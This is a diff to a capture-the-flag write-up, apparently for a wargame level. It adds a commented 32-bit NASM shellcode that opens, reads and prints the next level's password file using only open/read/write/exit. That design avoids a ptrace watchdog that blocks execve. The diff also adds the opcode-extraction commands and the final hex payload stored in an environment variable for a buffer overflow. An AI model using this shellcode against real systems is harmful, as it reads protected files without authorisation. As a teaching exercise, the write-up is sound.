@@ -74,13 +74,80 @@ So : 156 bytes of padding, then 4 bytes overwriting the saved EIP.
 
 ## The exec-less shellcode
 
-Since `execve` is forbidden by the ptrace watchdog, we use a shellcode that `open()`s the next password file, `read()`s it, and `write()`s it to stdout. The target path is appended at the end of the shellcode :
+Since `execve` is forbidden by the ptrace watchdog, we can't just pop a shell. Instead we write a shellcode that **opens** the next password file, **reads** it byte by byte, and **writes** each byte to stdout — using only the `open` / `read` / `write` / `exit` syscalls.
+
+### Writing it in assembly
+
+The logic, written as commented NASM (x86, 32-bit). The trick at the heart of it is the **jmp / call / pop** pattern : we put the file path *after* a `call`, and because `call` pushes the address of the instruction that follows it, that address (the start of our string) lands on the stack, ready for a `pop`. This avoids hardcoding any address for the path.
+
+```nasm
+BITS 32
+
+_start:
+    xor eax, eax            ; clear registers
+    xor ebx, ebx
+    xor ecx, ecx
+    xor edx, edx
+    jmp  call_path          ; jump down to the CALL that sits just before the path
+
+open_file:
+    pop  ebx                ; ebx = address of "/home/users/level05/.pass" (pushed by call)
+    mov  al, 5              ; SYS_open
+    xor  ecx, ecx           ; flags = O_RDONLY (0)
+    int  0x80               ; open(path, O_RDONLY)
+    mov  esi, eax           ; save returned fd in esi
+
+    jmp  read_byte          ; enter the read/write loop
+
+exit_prog:                  ; reached when read() returns 0 (EOF)
+    mov  al, 1              ; SYS_exit
+    xor  ebx, ebx           ; status 0
+    int  0x80               ; exit(0)
+
+read_byte:
+    mov  ebx, esi           ; ebx = fd
+    mov  al, 3              ; SYS_read
+    sub  esp, 1             ; carve 1 byte of buffer on the stack
+    lea  ecx, [esp]         ; ecx = &buffer
+    mov  dl, 1              ; count = 1 byte
+    int  0x80               ; read(fd, buf, 1)
+
+    xor  ebx, ebx
+    cmp  ebx, eax           ; did read() return 0 ? (end of file)
+    je   exit_prog          ; yes -> exit cleanly
+
+    mov  al, 4              ; SYS_write
+    mov  bl, 1              ; fd = 1 (stdout)
+    mov  dl, 1              ; count = 1 byte
+    int  0x80               ; write(1, buf, 1)
+    add  esp, 1             ; release the 1-byte buffer
+    jmp  read_byte          ; loop on the next byte
+
+call_path:
+    call open_file          ; pushes the address of the bytes that follow...
+    db  "/home/users/level05/.pass"   ; ...i.e. the path string
+```
+
+### Assembling and extracting the bytes
+
+We assemble the source and pull the raw opcodes out :
+
+```bash
+nasm -f elf32 sc.asm -o sc.o
+objdump -d sc.o | grep '^ ' | cut -f2 | tr -d ' \n' | sed 's/../\\x&/g'
+```
+
+(Equivalently, with pwntools : `asm(open('sc.asm').read(), arch='i386')`.)
+
+This yields the machine code, to which we append the path string in clear text. The final payload, ready to drop into an environment variable :
 
 ```bash
 export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
 ```
 
-The syscalls used (`al=5` open, `al=3` read, `al=4` write, `al=1` exit) confirm there's no `execve` (`al=0xb`), so the watchdog never fires.
+Disassembling these exact bytes back confirms the layout — open at offset `0x0a`, the read/write loop from `0x1b`, the EOF check `cmp ebx,eax ; je`, and the trailing `call 0xa` at `0x3c` that pushes the path. The syscall numbers used are `al=5` (open), `al=3` (read), `al=4` (write) and `al=1` (exit). Crucially **none is `al=0xb` (`execve`)**, so the parent's ptrace watchdog never trips.
+
+One practical note : because the path is appended right after the `call`, swapping in a different file path requires no recomputation of the jump offsets — the `call` always targets the code above it, and whatever bytes physically follow it are treated as the string.
 
 Storing the shellcode in an **environment variable** is convenient : it keeps the payload out of the overflow buffer entirely, and the variable lives at a high, fairly stable address on the stack that we can jump to.
 
